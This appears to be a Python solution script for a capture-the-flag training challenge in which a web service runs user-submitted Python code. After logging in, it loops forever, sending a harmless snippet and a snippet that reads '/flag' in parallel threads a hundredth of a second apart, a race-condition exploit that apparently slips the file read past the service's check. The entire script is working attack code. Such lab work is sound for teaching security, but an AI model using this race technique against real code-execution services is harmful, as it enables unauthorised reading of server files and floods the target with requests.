import threading
import requests
import time
import string

def login(session,username,password):
	url="http://pybook.training.jinblack.it/login"
	data = {"username":username,"password":password}
	r = session.post(url,data=data)
	#return r.text

def registration(session,username,password):
	url="http://pybook.training.jinblack.it/register"
	data = {"username":username,"password":password}
	r = session.post(url,data=data)
	#return r.text

def run(session, code):
    url="http://pybook.training.jinblack.it/run"
    data = code
    r = session.post(url,data=data)
    print(r.text)




session = requests.Session()
username = "lkjlkj"
password = "lkjlkj"

login(session,username,password)
#python code for opening a file and reading it
code2 = 'print(open("/flag","r").read())'
code1 = "print('hello world')"
while True:
	t1 = threading.Thread(target=run, args=(session,code1))
	t2 = threading.Thread(target=run, args=(session,code2))
	t1.start()
	time.sleep(0.01)
	t2.start()
	t1.join()
	t2.join()